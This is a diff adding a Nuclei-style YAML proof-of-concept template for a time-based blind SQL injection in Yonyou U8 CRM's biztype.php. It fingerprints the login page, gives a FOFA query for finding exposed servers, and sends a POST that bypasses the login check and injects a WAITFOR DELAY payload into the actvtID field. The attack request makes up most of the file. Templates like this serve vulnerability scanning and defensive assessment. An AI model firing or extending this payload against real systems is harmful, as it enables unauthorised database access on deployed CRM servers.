@@ -1,0 +1,52 @@
+id: poc-yaml-yongyou-u8-crm-biztype-php-sqli
+info:
+  name: 用友U8CRM biztype.php SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: 用友U8+CRM
+    fofa: title="用友U8CRM"
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET /login/login.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "用友U8CRM"
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        POST /activity/biztype.php?DontCheckLogin=1 HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: PHPSESSID=bgsesstimeout-;
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        actvtID=1';WAITFOR DELAY '0:0:{{t1}}'--
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "[]"
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
